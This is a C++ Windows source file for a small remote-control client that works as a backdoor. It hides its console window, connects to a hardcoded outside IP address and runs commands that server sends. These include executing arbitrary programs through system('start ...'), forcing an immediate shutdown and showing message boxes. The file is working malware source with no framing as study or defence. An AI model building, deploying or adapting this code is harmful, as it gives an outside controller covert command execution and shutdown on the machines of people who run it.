#include <iostream>
#include <WinSock2.h>
#include <tchar.h>

#include <atlstr.h>

#pragma comment(lib, "ws2_32")

int port = 1234;
#define PACKET_SIZE 1024
#define SERVER_IP "121.136.106.159"
HWND hwnd;

using namespace std;

CString GetMyIP()
{
	CString ipAddr;
	WSADATA wsaData;
	WORD wVersionRequested = MAKEWORD(2, 0);
	if (WSAStartup(wVersionRequested, &wsaData) == 0)
	{
		char name[256];
		if (gethostname(name, sizeof(name)) == 0)
		{
			PHOSTENT hostinfo = gethostbyname(name);
			if (hostinfo != NULL)

			{
				ipAddr = inet_ntoa(*(struct in_addr*)*hostinfo->h_addr_list);
			}
		}
		WSACleanup();
	}

	return ipAddr;
}

int main()
{
	TCHAR programpath[_MAX_PATH];

	GetModuleFileName(NULL, programpath, _MAX_PATH);

	hwnd = GetConsoleWindow();
	ShowWindow(hwnd, SW_HIDE);

	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	SOCKET hSocket;
	hSocket = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

	SOCKADDR_IN tAddr = {};
	tAddr.sin_family = AF_INET;
	tAddr.sin_port = htons(port);
	tAddr.sin_addr.s_addr = inet_addr(SERVER_IP);

	connect(hSocket, (SOCKADDR*)&tAddr, sizeof(tAddr));

	//CString cMsg = GetMyIP() + " Connect";
	//send(hSocket, cMsg, strlen(cMsg), 0);
	
	char recve[PACKET_SIZE] = { 0 }, title[PACKET_SIZE] = { 0 }, sub[PACKET_SIZE] = { 0 };
	while (1) {
		ZeroMemory(&recve, PACKET_SIZE);
		ZeroMemory(&title, PACKET_SIZE);
		ZeroMemory(&sub, PACKET_SIZE);
		recv(hSocket, recve, PACKET_SIZE, 0);
		if (!strcmp(recve, "exit")) {
			break;
		}
		else if (!strcmp(recve, "msgbox")) {
			recv(hSocket, title, PACKET_SIZE, 0);
			recv(hSocket, sub, PACKET_SIZE, 0);
			MessageBox(0, sub, title, MB_OK);
		}
		else if (!strcmp(recve, "run")) {
			recv(hSocket, sub, PACKET_SIZE, 0);
			sprintf(title, "start %s", sub);
			system(title);
		}
		else if (!strcmp(recve, "showconsole")) {
			recv(hSocket, sub, PACKET_SIZE, 0);
			if (!strcmp(sub, "true")) {
				hwnd = GetConsoleWindow();
				ShowWindow(hwnd, SW_SHOW);
			}
			else if (!strcmp(sub, "false")) {
				hwnd = GetConsoleWindow();
				ShowWindow(hwnd, SW_HIDE);
			}
		}
		else if (!strcmp(recve, "off")) {
			system("shutdown -s -t 0");
		}
	}
	//char cBuffer[PACKET_SIZE] = {};
	//recv(hSocket, cBuffer, PACKET_SIZE, 0);

	//cout << "Recv Msg : " << cBuffer << endl;

	closesocket(hSocket);

	WSACleanup();
}